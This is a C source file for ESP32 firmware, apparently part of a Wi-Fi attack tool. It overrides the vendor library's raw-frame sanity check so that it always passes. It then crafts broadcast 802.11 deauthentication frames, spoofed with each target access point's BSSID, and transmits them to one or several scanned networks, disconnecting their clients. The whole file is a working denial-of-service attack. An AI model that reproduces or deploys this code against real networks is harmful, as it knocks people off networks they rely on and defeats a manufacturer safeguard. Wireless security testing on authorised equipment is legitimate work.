/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

#include <esp_wifi.h>

#include "wifi_controller.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 */
uint8_t deauth_frame_default[] = {
    0xC0, 0x00,                         // Type/Subtype: Deauthentication (0xC0)
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Nadawca (BSSID AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
    0x00, 0x00,                         // Seq Control
    0x01, 0x00                          // Reason: Unspecified (0x0001)
};


/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
{
    ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_INFO);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count)
{

    if (ap_records == NULL || count == 0)
    {
        ESP_LOGI(TAG, "ERROR: Tablica ap_records jest pusta!");
        return;
    }

    for (size_t i = 0; i < count; i++)
    {
        wifi_ap_record_t *ap_record = &ap_records[i];

        if (ap_record == NULL)
        {
            ESP_LOGI(TAG, "ERROR: Pusty element");
            return;
        }

        ESP_LOGI(TAG, "Preparations to send deauth frame...");
        ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
        ESP_LOGI(TAG, "Target CHANNEL: %d", ap_record->primary);
        ESP_LOGI(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

        //ESP_LOGI(TAG, "Disconnecting Wi-Fi wifictl_sta_disconnect()");
        //wifictl_sta_disconnect();          
        //vTaskDelay(pdMS_TO_TICKS(500)); 

        //esp_wifi_set_mode(WIFI_MODE_STA); // Przełączenie na sam STA
        //wifictl_set_channel(ap_record->primary);
        //vTaskDelay(pdMS_TO_TICKS(500)); // Krótka pauza
        //esp_wifi_set_mode(WIFI_MODE_APSTA); // Powrót do APSTA

        //ESP_LOGW(TAG, "Restarting Wi-Fi to apply channel change...");
        //esp_wifi_stop();
        //vTaskDelay(pdMS_TO_TICKS(500)); 
        //esp_wifi_start();

        uint8_t deauth_frame[sizeof(deauth_frame_default)];
        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
        memcpy(&deauth_frame[10], ap_record->bssid, 6);
        memcpy(&deauth_frame[16], ap_record->bssid, 6);

        //vTaskDelay(pdMS_TO_TICKS(1000)); // Poczekaj sekundę
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record)
{
    ESP_LOGI(TAG, "Sending deauth frame...");
    ESP_LOGI(TAG, "CHANNEL: %d", ap_record->primary);
    ESP_LOGI(TAG, "SSID: %s", ap_record->ssid);
    ESP_LOGI(TAG, "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    //ESP_LOGI(TAG, "Kicking all connected STAs from AP");
    //ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
    //esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    //esp_wifi_set_promiscuous(true);
    //ESP_LOGI(TAG, "Channel set.");

    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}